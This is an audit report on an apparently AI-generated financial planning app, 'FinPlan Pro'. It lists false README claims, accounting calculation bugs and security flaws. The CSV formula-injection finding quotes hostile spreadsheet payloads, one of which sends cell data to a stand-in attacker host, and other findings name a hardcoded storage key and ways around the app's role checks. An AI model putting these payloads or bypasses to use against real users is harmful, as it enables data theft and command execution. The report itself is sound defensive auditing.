# AUDIT REPORT — FINPLAN PRO ZERO COMPROMISE MODE

**Audit ID:** ZCFA-2026-07-28-001
**Date:** 2026-07-28
**Auditor role:** Supreme FP&A Product Auditor / Financial Systems Forensic Engineer / Adversarial Red Team
**Trust model:** absolute_zero_trust — guilty until proven correct
**Verdict:** **UNACCEPTABLE**

---

## TARGET IDENTIFICATION

| Field | Value |
|---|---|
| Repository | `Warzonesiddiki/fp-A-betterversion` |
| Product | FinPlan Pro |
| Commit audited | `38e7f0f58c71d0a51da820bbfcc064d7f1476b5e` |
| Branch | `arena/019fa87f-fp-a-betterversion` (from `main`) |
| Git history depth | **1 commit total** (squashed); author = `arena-ai-coding-agent[bot]` |
| Human-authored commits | **0** |
| Working tree at audit start | clean |
| Node / npm | v22.22.3 / 10.9.8 |
| Declared version | package.json `1.0.0`; `src-tauri/src/lib.rs` reports `0.1.0` |
| Repo size | 34 MB |

**Immediate structural observation:** the repository has exactly one commit and zero human commits. Every commit-message claim referenced in the audit brief (`TSC=0`, `--no-verify`, `@ts-nocheck in SageConnector`, `deep wizard tests 43/54`) **is not present in this repository's history** and is therefore unverifiable here. All such claims are marked `Unverified — history squashed`, which is itself a HIGH provenance defect: the evidence trail the project cites as proof of quality has been destroyed.

---

## EXECUTIVE BRUTAL SUMMARY

FinPlan Pro does not work. The shipped production bundle throws `ReferenceError: BookOpen is not defined` inside `Sidebar`, a component mounted by `AppLayout` on every authenticated route. The application is not merely incomplete — it is non-functional for its primary navigation shell, and the defect is present in the compiled artifact produced by `npm run build`.

The "Production-Ready" badge is false. TypeScript compilation fails. ESLint fails. The full test suite cannot complete — it hangs indefinitely. 316 tests fail across the five shards that did complete; the sixth shard timed out after 1,400 seconds without finishing. Every quality gate the project advertises is either failing or structurally inert: the Husky hooks are non-executable, `.husky/_/husky.sh` does not exist, `core.hooksPath` is unset, and `.npmrc` sets `ignore-scripts=true`, which prevents `husky` from ever installing. The gates are decorative.

The financial core is worse than incomplete; it is actively wrong in ways that produce silent misstatement. A missing FX rate returns `0`, and `convert()` multiplies by that zero, erasing a foreign subsidiary's entire balance with no error, no warning, and no log. The dated-rate lookup uses `find(e => e.date <= date)` against an ascending-sorted array and therefore returns the **oldest** rate on file rather than the period rate. The consolidation entry point wraps its entire body in `try { ... } catch { return this.emptyResult(); }`, and `emptyResult()` reports `isBalanced: true` with all totals zero — meaning any internal error is presented to a CFO as a clean, balanced, zero-value consolidation. `validateEntries` in the GL store never checks that debits equal credits: the foundational double-entry invariant of accounting is absent from the ledger validator.

The README's central technical differentiator — "100% integration of `decimal.js` across all financial formula and aggregation layers … guarantees absolute mathematical exactness" — is false. Exactly **one** non-test file in the entire codebase imports `decimal.js`. All 214 remaining engines perform money arithmetic in IEEE-754 doubles.

Security claims are theater. "End-to-end encryption" resolves to AES-256-GCM keyed by a hardcoded string literal, `'finplan-master-storage-key-change-in-production'`, which I extracted verbatim from the built asset `dist/assets/masterStorage-oF2BpH5d.js`. Because Vite replaces `process.env` with `{}` in browser builds, the environment-variable override can never fire — the constant is unconditional. The audit trail's "integrity hash" is a non-cryptographic djb2 variant computed over a **freshly generated** `uid()` and `now()` rather than the record's own `id` and `timestamp`, so no verifier can ever recompute it. The Tauri desktop shell grants `shell:allow-execute` plus unscoped `fs:allow-read`/`fs:allow-write`. The auto-updater is `active: true` and points at `updates.finplanpro.com`, which does not resolve in DNS.

Feature breadth is largely inventory, not capability. 105 of 181 engines (58%) are never referenced by any page, component, store, service, or hook — including CapEx, Depreciation, DebtSchedule, CashFlowWaterfall, and Compliance. Period close and period locking, an absolute FP&A and SOX table stake, do not exist in any enforcing form: `PeriodCloseEngine` is exported through a barrel file and consumed by nothing.

Not everything is broken. The Vite build succeeds in 4.96s and the bundle budget genuinely passes (113.04 KB gzip main against a 150 KB limit; 1,959.86 KB total against 2,048 KB). The engines shard is genuinely strong at 4,096/4,100 passing. `SafeMathParser` correctly avoids `eval`. The plugin sandbox performs real acorn AST validation. These are real and they are not enough, because a product that crashes on load and silently zeroes foreign-currency revenue cannot be shipped to a finance team under any circumstances.

**Zero-compromise readiness: 0%. This build must not reach a user.**

---

## COMMAND EXECUTION EVIDENCE

| # | Command | Exit | Duration | Result |
|---|---|---|---|---|
| 1 | `npm ci --no-audit --no-fund` | 0 | 20s | 1,036 packages. **Note:** `.npmrc` `ignore-scripts=true` ⇒ `husky` never installs |
| 2 | `npx tsc --noEmit` | **2** | 37s | **1 error** — `src/components/layout/Sidebar.tsx(216,12): error TS2304: Cannot find name 'BookOpen'.` |
| 3 | `npx eslint src --max-warnings 0` | **1** | 102s | **13 problems (1 error, 12 warnings)** |
| 4 | `npm run build` (vite build) | 0 | 4.96s | PASS — dist emitted |
| 5 | `node scripts/bundle-check.js` | 0 | <1s | PASS — main 113.04 KB gz / total 1959.86 KB gz |
| 6 | `vitest run` (full suite) | **HANG** | >2,700s | Never completed. No summary emitted |
| 7 | `vitest run src/engines` | 1 | 206s | 4 failed / 4,096 passed (4,100); 1 of 204 files failed |
| 8 | `vitest run src/store` | 1 | ~800s | **219 failed / 408 passed (627); 27 of 40 files failed** |
| 9 | `vitest run src/utils` | 0 | ~300s | 864 passed, 6 skipped (870); 49 of 50 files passed |
| 10 | `vitest run src/components` | 1 | ~1,200s | 47 failed / 1,988 passed (2,037); 9 of 303 files failed |
| 11 | `vitest run src/services` | 1 | ~900s | 46 failed / 845 passed (891); 4 of 33 files failed |
| 12 | `vitest run src/pages` | **124** | 1,400s | **TIMEOUT — did not finish.** 73 files passed, 4 failed before kill |
| 13 | `npm audit --omit=dev` | 1 | 2s | **14 HIGH** in production dependencies |
| 14 | `npx playwright install chromium` | 1 | 8s | Download blocked in sandbox — E2E **NOT RUN** (coverage gap) |
| 15 | `getent hosts updates.finplanpro.com` | 2 | <1s | **DNS does not resolve** |
| 16 | `npx vitest run --coverage` | — | — | **NOT RUN** — full suite hangs; coverage unobtainable (coverage gap) |
| 17 | `npm run tauri:build` | — | — | **NOT RUN** — no Rust toolchain in sandbox (coverage gap) |

### Aggregate measured test results (5 of 6 shards)

```
total tests   : 8,525
passed        : 8,201
failed        :   316
pass rate     : 96.20%
```

The `src/pages` shard (188 test files) is **excluded** from these numbers because it timed out. The true full-suite result is unknown and unobtainable at this commit.

---

## CLAIM VERIFICATION MATRIX

| ID | Claim | Source | Status | Evidence | Sev if false |
|---|---|---|---|---|---|
| C-0001 | "Status: 🟢 Production-Ready" | README:end | **REFUTED** | tsc exit 2; eslint exit 1; full suite hangs; runtime `ReferenceError` in shipped bundle | CRITICAL |
| C-0002 | "202+ financial engines" | README | **PARTIALLY VERIFIED** | 215 `.ts` files in `src/engines` (181 top-level non-bench). Count plausible; **utility is not** — 105/181 unreferenced | MEDIUM |
| C-0003 | "192 pages" | README | **PARTIALLY VERIFIED** | 195 non-test `.tsx` under `src/pages`; 193 `path=` in App.tsx | LOW |
| C-0004 | "35 stores" | README | **REFUTED** | 40 non-test store files in `src/store`. COMPLETION_TASKLIST says 73. Three mutually exclusive numbers | HIGH |
| C-0005 | "Web Workers (7 active)" + named table | README | **REFUTED** | Only 4 `.worker.ts` exist (`consolidation`, `monte-carlo`, `batch-calc`, `storage`). README's `formula`, `export`, `sync`, `analytics`, `transform` workers **do not exist** | HIGH |
| C-0006 | "8,334+ tests across 825 files" | README | **PARTIALLY VERIFIED** | 896 test files found; 8,525 tests counted across 5 of 6 shards. Count roughly honest | LOW |
| C-0007 | "Test Coverage 80%+" | README | **REFUTED** | `vite.config.ts` thresholds are `statements/branches/functions/lines: 50`. Actual coverage unobtainable (suite hangs) | HIGH |
| C-0008 | "Vitest Coverage_100%" badge | README badge | **REFUTED** | Contradicts the same file's "80%+" and the config's 50% | MEDIUM |
| C-0009 | "100% integration of decimal.js across all financial formula and aggregation layers guarantees absolute mathematical exactness" | README | **REFUTED** | **Exactly 1** non-test file imports `decimal.js` (`src/engines/SafeMathParser.ts`). 214 other engines use float | CRITICAL |
| C-0010 | "End-to-end encryption / Full-stack encryption for sensitive data" | README | **REFUTED** | Hardcoded key `finplan-master-storage-key-change-in-production` extracted from `dist/assets/masterStorage-oF2BpH5d.js` | CRITICAL |
| C-0011 | "Real-time data synchronization" | README | **REFUTED** | No sync worker; `WebSocketManager` has a failing test; app is offline-first per `.env.example` | HIGH |
| C-0012 | "Collaborative editing capabilities" | README | **UNVERIFIED** | `collaborationStore` exists; 5 of 8 tests fail | HIGH |
| C-0013 | "Plugin system with marketplace" | README | **PARTIALLY VERIFIED** | `PluginMarketplace.ts` exists; no registry backend; `PLUGIN_MARKETPLACE_URL` commented out | MEDIUM |
| C-0014 | "Accessibility (WCAG 2.2 AA compliance)" | README | **REFUTED** | CI a11y job is `continue-on-error: true` and skips when `test:a11y` is undefined — it **is** undefined in package.json. Zero enforcement | HIGH |
| C-0015 | "SQL storage — better-sqlite3 for local persistence" (Tauri) | README | **REFUTED** | Frontend uses `@tauri-apps/plugin-sql` + `sql.js`. `better-sqlite3` is a **server-only** dep, absent from client | MEDIUM |
| C-0016 | "Vite 7.3" badge / "Bundler: Vite 7" | README | **REFUTED** | `package.json` pins `vite: ^8.0.16` | LOW |
| C-0017 | "Tailwind 4.1" badge | README | **REFUTED** | `package.json` pins `tailwindcss: 4.3.3` | LOW |
| C-0018 | "TypeScript (64.1%)" | README | **UNVERIFIED** | No linguist output; unverifiable claim presented as statistic | LOW |
| C-0019 | "Lines of Code 45,000+" | README | **UNVERIFIED** | 1,020 non-test source files; figure appears understated and is unsourced | LOW |
| C-0020 | "Size Limits (CI Enforced) main ≤150KB, total ≤2MB" | README | **VERIFIED** | `bundle-check.js` exit 0: 113.04 KB / 1959.86 KB | — |
| C-0021 | "CI/CD: 1 Type Check → 2 Lint → 3 Tests → 4 Build → 5 Bundle" | README | **VERIFIED (as config)** but gates **currently red** | `ci.yml` requires typecheck+lint+test+build; typecheck and lint fail at this commit | HIGH |
| C-0022 | "Husky pre-commit hooks" | README / `.husky/*` | **REFUTED** | `.husky/pre-commit` and `pre-push` are mode `-rw-r--r--` (**not executable**); `.husky/_/husky.sh` **missing**; `core.hooksPath` **unset**; `.npmrc ignore-scripts=true` blocks `prepare`. Hooks cannot run | HIGH |
| C-0023 | COMPLETION_TASKLIST: "1,874 TS/TSX source files" | Tasklist | **REFUTED** | 1,916 total; 1,020 non-test |
| C-0024 | COMPLETION_TASKLIST: "73 Zustand stores" | Tasklist | **REFUTED** | 40 non-test store files. README says 35 | HIGH |
| C-0025 | COMPLETION_TASKLIST: "373 financial engines" | Tasklist | **REFUTED** | 215 files / 181 top-level engines. README says 202+ | HIGH |
| C-0026 | COMPLETION_TASKLIST: "957 test files" | Tasklist | **REFUTED** | 896 test files | MEDIUM |
| C-0027 | COMPLETION_TASKLIST: "14 Web Workers" | Tasklist | **REFUTED** | 4 worker files | HIGH |
| C-0028 | COMPLETION_TASKLIST 0.2 `[x]` "Zero TypeScript errors" | Tasklist | **REFUTED** | tsc exit 2, TS2304 | CRITICAL |
| C-0029 | COMPLETION_TASKLIST 0.5 `[x]` "Linting baseline" | Tasklist | **REFUTED** | eslint exit 1 with 1 error | HIGH |
| C-0030 | COMPLETION_TASKLIST 1.1.1 `[x]` "glStore production-ready … no `any`" | Tasklist | **REFUTED** | `validateEntries` omits debit=credit invariant; `validCount` arithmetic wrong | CRITICAL |
| C-0031 | COMPLETION_TASKLIST 1.2.1 `[x]` "Full backup/restore + Integrity verification" | Tasklist | **REFUTED** | All 5 backup tests in `cubeMigration.test.ts` **time out at 15s**; file consumed 180s | CRITICAL |
| C-0032 | Commit claims: `TSC=0`, `--no-verify`, `@ts-nocheck in SageConnector` | Audit brief | **UNVERIFIABLE** | History squashed to 1 commit. `@ts-nocheck` count in repo = **0** | HIGH (provenance) |
| C-0033 | "offline-first … no API keys, no telemetry, no cloud URLs" | `.env.example` | **REFUTED** | `tauri.conf.json` sets `updater.active: true` → `https://updates.finplanpro.com` | MEDIUM |
| C-0034 | "Rate limiting — API throttling" | README | **PARTIALLY VERIFIED** | `server/src/middleware/rateLimit.ts` exists, but server is **not installed** (`server/node_modules` = 0) and **not** in the test run | HIGH |
| C-0035 | "SQL injection prevention — parameterized queries (better-sqlite3)" | README | **UNVERIFIED** | Server excluded from all test execution | HIGH |

**Claims: 35 assessed — 20 REFUTED, 5 PARTIALLY VERIFIED, 6 UNVERIFIED/UNVERIFIABLE, 2 VERIFIED, 2 verified-as-config-only.**

---

## REPOSITORY INVENTORY AND STATISTIC RECONCILIATION

| Metric | README | COMPLETION_TASKLIST | **Measured** | Verdict |
|---|---|---|---|---|
| TS/TSX source files | — | 1,874 | 1,916 total / 1,020 non-test | Both wrong |
| Pages (non-test) | 192 | 192 | 195 | Close |
| Routes (`path=`) | 192 | — | 193 | Close |
| Zustand stores | 35 | 73 | 40 | **Both wrong** |
| Financial engines | 202+ | 373 | 215 files / 181 top-level | **Both wrong** |
| Test files | 825+ | 957 | 896 | Both wrong |
| Web Workers | 7 (named) | 14 | **4** | **Both grossly wrong** |
| Total tests | 8,334+ | — | 8,525 (5/6 shards) | Roughly honest |
| Coverage | 80%+ / 100% badge | — | threshold 50%; actual unobtainable | **False** |

Process/documentation artifact inventory: **407 markdown files** repo-wide — `docs/` 307, `reports/` 45, `prompt/` 18, `_bmad/` 14, `.claude/` 7, `.codex/` 5, `agents/` 5, `.agents/` 2, `skills/` 1, `plan/` 1, `plan and advice/` 1. Against **1,020** non-test source files, that is roughly one process document for every 2.5 source files. The bundle-check script emits `CAVEMAN PERSIST — Multi-Muse bundle detected: 9 Muses, 2615 files — [Apollo, Artemis, Atlas, Hephaestus, Hera, Hermes, Mnemosyne, Prometheus, Strategos]`. This is agent-persona ceremony embedded in a build gate. It verifies nothing about the product.

---

## FINANCIAL CORRECTNESS AUDIT

This is the section that ends the product in its current state.

### F-0001 — CRITICAL — Missing FX rate silently zeroes foreign subsidiary balances
**Risk 10/10 · Confirmed · `src/engines/FXEngine.ts:33-49`**

```ts
static getRate(from: string, to: string, date?: string): number {
  if (from === to) return 1;
  const entries = this.rates.get(key) ?? [];
  if (entries.length === 0) return 0;        // ← missing rate === 0
  ...
}
static convert(amount: number, from: string, to: string, date?: string): number {
  if (!Number.isFinite(amount)) return 0;
  const rate = this.getRate(from, to, date);
  return rate === 0 ? 0 : amount * rate;     // ← returns 0, no throw, no log
}
```

**Executed PoC:**
```
EUR subsidiary revenue: 12500000
Consolidated USD reported: 0
Expected at ~1.08:  13500000
MISSTATEMENT: 13,500,000 USD understated, NO ERROR RAISED
```

A rate not yet loaded for the close period causes the subsidiary to vanish from consolidated revenue. The number is wrong, it is presented with full confidence, and nothing anywhere surfaces the condition.

**Required fix:** `getRate` must throw `MissingFXRateError` carrying `{from,to,date}`. `convert` must propagate. Consolidation must halt and surface a blocking banner naming the missing pair and period. A sentinel `0` must never be a legal rate.

### F-0002 — CRITICAL — Dated rate lookup returns the OLDEST rate, not the period rate
**Risk 10/10 · Confirmed · `src/engines/FXEngine.ts:38`**

```ts
const entry = entries.find((e) => e.date <= date) ?? entries[entries.length - 1];
```
`entries` is sorted **ascending** by `setRate`. `Array.find` returns the **first** match, so any date at or after the earliest rate returns the earliest rate forever.

**Executed PoC:**
```
Rate lookup for 2026-03-31 on ascending array -> picks: {"date":"2026-01-31","rate":1.05}
CORRECT answer should be 1.09; got 1.05 => uses OLDEST rate
```

**The test suite enshrines this bug.** `src/engines/FXEngine.test.ts:27`:
```ts
FXEngine.setRate('USD','EUR',0.85,'2026-01-01');
FXEngine.setRate('USD','EUR',0.90,'2026-06-01');
expect(FXEngine.getRate('USD','EUR','2026-03-01')).toBe(0.85);  // asserts the defect
```
This is the most dangerous class of vibe-code artifact: a passing test that certifies incorrect financial behavior.

**Required fix:** select the latest entry with `e.date <= date` (`filter(...).at(-1)` or reverse iteration). Rewrite the test to assert 0.85 for `2026-03-01` **only** because June's rate is future-dated, and add a case proving `2026-07-01` yields 0.90.

### F-0003 — CRITICAL — Consolidation swallows every error and reports "balanced"
**Risk 10/10 · Confirmed · `src/engines/ConsolidationEngine.ts:365-367, 868-902`**

```ts
} catch (error) {
  return this.emptyResult();     // no logging, no rethrow, error discarded
}
```
`emptyResult()` returns all totals `0` **and `isBalanced: true`, `imbalanceAmount: 0`** — at both the result and worksheet level. Any exception anywhere in the 15-step pipeline is rendered as a clean, balanced, zero consolidation. A CFO cannot distinguish "no data" from "the engine crashed."

**Required fix:** delete the catch or rethrow as `ConsolidationFailedError`. If a neutral object must exist, it must carry `isBalanced: false` and `status: 'failed'`, and the UI must render a blocking error.

### F-0004 — CRITICAL — GL validator does not enforce debits = credits
**Risk 9/10 · Confirmed · `src/store/glStore.ts:472-503`**

`validateEntries` checks presence of `accountCode`, presence of a date, non-negativity, and finiteness. It **never** checks that total debits equal total credits. The single most fundamental invariant in double-entry accounting is absent from the ledger's validator. Unbalanced journals import cleanly.

**Required fix:** add a batch-level invariant `Σdebit − Σcredit === 0` within a defined tolerance, plus per-journal grouping by `journalId`. Reject the import on violation and report the exact imbalance.

### F-0005 — HIGH — `validCount` arithmetic subtracts errors from rows
**Risk 6/10 · Confirmed · `src/store/glStore.ts:500`**

```ts
validCount: Math.max(0, entries.length - errors.length),
```
Errors are per-**violation**, not per-**row**; one bad row can emit three errors.

**Executed PoC:** `5 entries, 1 bad row producing 3 errors => validCount: 2  (TRUE ANSWER: 4)`

The import wizard reports the wrong number of accepted rows.

**Required fix:** track a `Set<rowIndex>` of invalid rows; `validCount = entries.length - invalidRows.size`.

### F-0006 — CRITICAL — "100% decimal.js" is false; all money math is IEEE-754
**Risk 9/10 · Confirmed · repo-wide**

Exactly **one** non-test file imports `decimal.js`: `src/engines/SafeMathParser.ts`. Every other engine — consolidation, FX, depreciation, SaaS metrics, variance — uses native `number`. 27 `toFixed(2)` calls appear in engines.

**Executed PoC:**
```
1000 x 0.01 = 9.999999999999831   exact? false
0.1+0.2 = 0.30000000000000004     === 0.3? false
(1.005).toFixed(2) = 1.00   -- half-up expects 1.01
(2.675).toFixed(2) = 2.67   -- half-up expects 2.68
```
`toFixed` is not half-up and not banker's rounding; it is binary-representation-dependent. Penny drift accumulates across consolidation rollups, and rounded statements will fail tie-out against source ERP data.

**Required fix:** either implement `decimal.js` across all monetary paths and delete the claim, or adopt integer minor-units. Define and test an explicit rounding mode and a residual/penny-allocation strategy. Until done, strike the claim from the README.

### F-0007 — HIGH — CTA computed for income/expense accounts; invalid inputs silently return 0
**Risk 7/10 · Confirmed · `src/engines/FXEngine.ts:207-262`**

`calculateCTA` returns `0` for non-finite inputs (masking bad data) and `generateASC830Report` assigns `ctaAdjustment` to every category except `non-monetary` — including `income` and `expense`. Under ASC 830 income and expense translate at average rate with the difference flowing through the translation adjustment for the **net asset** position, not per revenue line. This double-counts translation effects.

**Required fix:** restrict CTA to the net-asset position; translate P&L at average rate; validate inputs and throw.

### F-0008 — HIGH — Formula engine accepts empty input
**Risk 6/10 · Confirmed · `src/engines/SafeMathParser.test.ts:1573-1580` (FAILING)**

```
FAIL  SafeMathParser > throws on empty string
AssertionError: expected [Function] to throw an error
FAIL  SafeMathParser > throws on whitespace-only string
```
`evaluate('')` and `evaluate('   ')` return without throwing. A blank driver formula silently yields a value instead of a validation error.

### F-0009 — HIGH — Balance tolerance is a hardcoded absolute $0.01
**Risk 6/10 · Confirmed · `src/engines/ConsolidationEngine.ts:324`**

```ts
const isBalanced = Math.abs(balanceCheck) < 0.01;
```
A fixed absolute epsilon does not scale. At $10B in assets, float accumulation error alone can exceed $0.01, producing false "unbalanced" alarms; conversely it is far too loose for penny-level statutory tie-out on small entities.

**Required fix:** relative tolerance scaled to total assets, with an absolute floor, and both configurable and disclosed on the report.

### Financial Engine Test Matrix (material engines)

| Engine | Tests | Known-answer vectors | Property tests | Adversarial | Verdict |
|---|---|---|---|---|---|
| ConsolidationEngine | 63 + 19 integration | Partial | None | **No** — no test for the silent-catch path | **INADEQUATE** |
| FXEngine | 27 | Yes — **but codifies 2 defects** | None | No | **HARMFUL** |
| MonteCarloEngine | 67 | Seeded PRNG present | Some | Not for cancellation | ADEQUATE |
| SafeMathParser | 377 (4 failing) | Yes | Yes (algebraic identities) | Partial | **FAILING** |
| glStore validateEntries | 36 (store file) | No debit=credit vector | None | No | **INADEQUATE** |
| PeriodCloseEngine | present | — | — | — | **ORPHAN — wired to nothing** |
| CapExEngine / DepreciationEngine / DebtScheduleEngine | tested | — | — | — | **ORPHAN — unreferenced by UI** |

---

## DATA INTEGRITY AND PERSISTENCE AUDIT

### F-0010 — CRITICAL — Backup and restore are entirely unproven; every backup test times out
**Risk 9/10 · Confirmed · `src/store/migration/cubeMigration.test.ts:183-224`**

```
FAIL  CubeMigration > backup > should create backup before migration when enabled
      Error: Test timed out in 15000ms.
FAIL  ... should store backup data for all migrated stores      — timeout
FAIL  ... should generate unique backup IDs                     — timeout
FAIL  ... should include timestamp in backup                    — timeout
FAIL  ... should track backup in migration instance             — timeout
```
The file consumed **180,123 ms**. The in-file comments are damning: `// SKIP: createBackup is slow (masterStorage IO + cube snapshot)` — the author intended to skip them but left them active, so they hang instead.

There is no restore proof anywhere in the repository. COMPLETION_TASKLIST 1.2.3 ("Global Backup/Restore UI … Gate: Full export → fresh environment → import → 100% data restored") is `[ ]` unchecked, correctly. Zero-compromise explicitly requires restore proof. **It does not exist.**

### F-0011 — CRITICAL — Storage writes have no error handling; silent data loss
**Risk 9/10 · Confirmed · `src/utils/masterStorage.ts:127-136`**

```ts
setItem: async (name, value) => {
  const encryptedValue = await encryptStorageValue(serialized);
  return chunkedSqlJsStorage.setItem(name, encryptedValue as any);   // no try/catch
},
```
No quota handling, no fallback, no user notification. A `QuotaExceededError` rejects a promise Zustand's persist middleware does not surface. The user continues working against state that is never durably written and loses everything on reload. The README claims "Graceful quota handling + fallback"; the code has neither.

### F-0012 — HIGH — Decryption failure silently returns ciphertext as plaintext
**Risk 7/10 · Confirmed · `src/utils/masterStorage.ts:118-125`**

```ts
try { return await decryptStorageValue(raw); }
catch { return raw; }   // hands the raw encrypted blob to JSON.parse
```
Corruption or key change yields a base64 blob passed to the store as if it were state. The comment concedes it: *"In production, enforce encryption."* It does not.

### F-0013 — HIGH — No period close, no period lock, anywhere
**Risk 8/10 · Confirmed · repo-wide**

`grep -rln "periodClose|isPeriodLocked|lockPeriod" src/store src/engines` → **no matches** outside `PeriodCloseEngine.ts` itself, which is referenced only by the barrel `src/engines/index.ts:164`. No store consults it. No mutation checks it. Closed periods can be edited freely. This is a SOX segregation/period-integrity failure and an absolute FP&A table stake.

---

## SECURITY AND PRIVACY AUDIT

### F-0014 — CRITICAL — Encryption key is a hardcoded literal shipped in the bundle
**Risk 10/10 · Confirmed · `src/utils/masterStorage.ts:21-25` → `dist/assets/masterStorage-oF2BpH5d.js`**

```ts
const STORAGE_KEY_RAW =
  typeof process !== 'undefined' && process.env?.MASTER_STORAGE_KEY
    ? process.env.MASTER_STORAGE_KEY
    : 'finplan-master-storage-key-change-in-production';
```

**Extracted from the built artifact:**
```
f process<`u`&&{}.MASTER_STORAGE_KEY?{}.MASTER_STORAGE_KEY:`finplan-master-storage-key-change-in-production`
```
Vite replaced `process.env` with `{}`. `{}.MASTER_STORAGE_KEY` is `undefined` **always**, so the fallback constant is unconditional. Worse, `.env.example` documents no `MASTER_STORAGE_KEY` at all — the override was never intended to be reachable. Every FinPlan Pro installation worldwide shares one key, printed in plaintext in a public JS asset. AES-256-GCM here provides **zero** confidentiality. The README's "End-to-end encryption" and "Full-stack encryption for sensitive data" are false.

**Required fix:** derive per-install keys from OS keychain (Tauri `keyring`) or a user passphrase via PBKDF2/Argon2 with a per-install salt; never ship a default. If browser-only, state plainly that at-rest encryption is not provided.

### F-0015 — CRITICAL — Audit trail integrity hash is unverifiable by construction
**Risk 9/10 · Confirmed · `src/store/auditTrailStore.ts:144-186`**

```ts
const simpleHash = (s) => { let h=0; for(...) h=((h<<5)-h+s.charCodeAt(i))|0; return Math.abs(h).toString(16).padStart(8,'0'); };

const makeEntry = (operation, input) => ({
  id: uid(),                          // ← call #1
  timestamp: now(),                   // ← call #1
  ...
  hash: simpleHash(JSON.stringify({
    id: uid(),                        // ← call #2 — DIFFERENT VALUE
    timestamp: now(),                 // ← call #2 — DIFFERENT VALUE
    ...
  })),
});
```
Three compounding defects:
1. **Unverifiable by construction** — the hash covers a different `uid()` and `now()` than the stored record. No verifier can ever recompute it. The control is decorative.
2. **Non-cryptographic** — djb2 variant truncated to 32 bits. Not collision-resistant by design. (I attempted second-preimage and birthday searches within a bounded compute budget and did **not** produce a collision; I therefore assert only the design defect, which is sufficient — a 32-bit non-cryptographic digest is unfit for tamper evidence regardless.)
3. **No chain** — each entry hashes only itself. Deleting or reordering entries is undetectable.

`previousValue`/`newValue` are also excluded from the hashed payload, so the financial delta itself is unprotected.

**Required fix:** SHA-256 over the canonical serialization of the **stored** record including before/after values, chained as `hash_n = SHA256(hash_{n-1} ‖ record_n)`, with a verifier and an append-only server-side sink.

### F-0016 — CRITICAL — Client-only RBAC on a local-first data path
**Risk 8/10 · Confirmed · `src/utils/rbacEnforcer.ts:126-166`**

27 of 40 stores wrap mutations in `enforce(...)`, which reads `useAuthStore.getState().user`. All of it runs in the browser against local storage. Two bypasses require no server interaction: (a) mutate the Zustand store via devtools to set `role: 'Admin'`; (b) decrypt the persisted blob with the hardcoded key from F-0014, flip the role, re-encrypt. The Express server implements `entityAuth`/`auth` middleware, but `server/node_modules` is empty, the server is excluded from all test runs, and the frontend defaults to `baseURL: '/api'` with no server running. Authorization for financial data is effectively advisory.

### F-0017 — CRITICAL — CSV/Excel export has no formula-injection defense
**Risk 8/10 · Confirmed · `src/utils/csv.ts:toCSV`**

```ts
const escape = (value) => {
  const raw = value == null ? '' : String(value);
  return /[",\n\r]/.test(raw) ? `"${raw.replace(/"/g,'""')}"` : raw;
};
```
Quotes and newlines are handled. Leading `=`, `+`, `-`, `@`, `\t`, `\r` are **not**. `grep -rn "sanitizeCsv|csvInjection|formulaInjection"` → **no matches repo-wide**. A GL description of `=cmd|'/c calc'!A1` or `=HYPERLINK("http://attacker/?d="&A1,"Click")` imported from an ERP and re-exported executes in the controller's Excel. This is CWE-1236, and it is squarely in scope for a tool whose core loop is import-GL → export-report.

**Required fix:** prefix any cell beginning with `= + - @ TAB CR` with `'`, apply to all CSV **and** ExcelJS writers, and add a regression corpus.

### F-0018 — HIGH — Plugin sandbox timeout is unenforceable
**Risk 7/10 · Confirmed · `src/plugins/PluginSandbox.ts:332-352`**

```ts
const result = sandboxFn(trackedProxy, finplanApi);        // synchronous
if (Date.now() - startTime > timeout) { return { success:false, error:`exceeded ${timeout}ms` }; }
```
The check runs **after** synchronous completion. `while(true){}` never returns; the tab freezes permanently.

**Executed PoC:** `Sync loop ran to completion. elapsed_ms= 1500 declared timeout_ms= 100` — the declared limit is 100 ms; 1,500 ms of main-thread blocking occurred before the check was reached.

The AST validator is genuine and rejects `eval`/`Function`/imports, and blocked globals are shadowed — that part is real work. But execution belongs in a terminable Worker, not on the main thread.

### F-0019 — HIGH — Tauri grants shell execution and unscoped filesystem access
**Risk 8/10 · Confirmed · `src-tauri/capabilities/default.json`**

```json
"permissions": ["core:default","shell:allow-execute","fs:default","fs:allow-read","fs:allow-write",
                "dialog:default","sql:default","sql:allow-execute","sql:allow-query","updater:default"]
```
`shell:allow-execute` permits arbitrary process execution. `fs:allow-read`/`fs:allow-write` carry no scope restriction. `sql:allow-execute` permits arbitrary SQL. Chained with F-0018 (plugin escape) or any XSS, this is full host compromise — from a spreadsheet app.

**Required fix:** delete `shell:allow-execute`. Scope `fs` to an app-data allowlist. Replace `sql:allow-execute` with named parameterized commands.

### F-0020 — HIGH — Auto-updater active against a non-existent domain
**Risk 7/10 · Confirmed · `src-tauri/tauri.conf.json`**

```json
"updater": { "active": true, "endpoints": ["https://updates.finplanpro.com/{{target}}/{{current_version}}"], "dialog": true, "pubkey": "dW50cnVzdGVk..." }
```
`getent hosts updates.finplanpro.com` → **does not resolve**. Update checks fail permanently and silently. The domain is unregistered, so a third party may register it. Signature verification does mitigate payload forgery — the `pubkey` is present and minisign-verified by Tauri — but availability, metadata leakage of `{{target}}/{{current_version}}`, and the trivially hijackable namespace remain. Also, `lib.rs` reports version `0.1.0` while `Cargo.toml` and `package.json` say `1.0.0`, so version comparison is already inconsistent.

### F-0021 — HIGH — 14 HIGH-severity vulnerabilities in production dependencies
**Risk 7/10 · Confirmed · `npm audit --omit=dev`**

```
HIGH react-router / react-router-dom :: RSC Mode CSRF Bypass Allows Action Execution Before 400 Response (GHSA-qwww-vcr4-c8h2)
HIGH exceljs → archiver → archiver-utils → glob → minimatch → brace-expansion :: DoS via unbounded expansion (GHSA-mh99-v99m-4gvg)
HIGH adm-zip :: Crafted ZIP triggers 4GB memory allocation (GHSA-xcpc-8h2w-3j85)
HIGH sharp :: libvips CVE-2026-33327, CVE-2026-33328, CVE-2026-35590, CVE-2026-35591 (GHSA-f88m-g3jw-g9cj)
HIGH @huggingface/transformers → onnxruntime-node → adm-zip
HIGH rimraf, zip-stream, glob, minimatch, brace-expansion, archiver, archiver-utils
```
The `adm-zip` and `brace-expansion` DoS paths are directly reachable: the product's stated core workflow is importing user-supplied `.xlsx` files through `exceljs`.

### F-0022 — MEDIUM — Sentry replays 100% of error sessions with no masking
**Risk 5/10 · Confirmed · `src/main.tsx:19-27`**

```ts
integrations: [Sentry.browserTracingIntegration(), Sentry.replayIntegration()],
replaysSessionSampleRate: 0.0,
replaysOnErrorSampleRate: 1.0,     // every error session recorded
```
